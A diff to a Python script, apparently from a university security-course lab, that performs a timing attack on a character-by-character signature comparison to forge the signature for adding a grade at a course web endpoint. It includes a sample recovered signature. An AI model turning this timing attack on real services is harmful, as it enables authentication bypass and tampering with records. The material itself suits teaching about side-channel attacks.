@@ -9,9 +9,8 @@ def sort(chars, cut=4):
 def most_common(L):
   return max(set(L), key=L.count)
 
-# An timing attack based on bad chrcmp function
-# that even works on Wi-Fi eduroam
-def timing_attack(name, grade, size=20, tries=20):
+# An timing attack based on time consuming chrcmp function
+def timing_attack(name, grade, size=20, retries=20):
   url = 'https://eitn41.eit.lth.se:3119/ha4/addgrade.php'
   params = {'name': name, 'grade': grade, 'signature': ''}
   hex_string = '0123456789abcdef'
@@ -22,7 +21,7 @@ def timing_attack(name, grade, size=20, tries=20):
   for i in range(size):
     sig_chars = []
 
-    for RETRY in range(tries):
+    for RETRY in range(retries):
       chars = []
 
       for j in range(len(hex_string)):
@@ -46,5 +45,5 @@ def timing_attack(name, grade, size=20, tries=20):
 
 if __name__ == '__main__':
   # Kalle, 5 => 6823ea50b133c58cba36
-  params = timing_attack(input('Name: '), int(input('Grade: ')))
+  params = timing_attack(input('Name: '), int(input('Grade: ')), retries=int(input('Retries: ')))
   print(params)
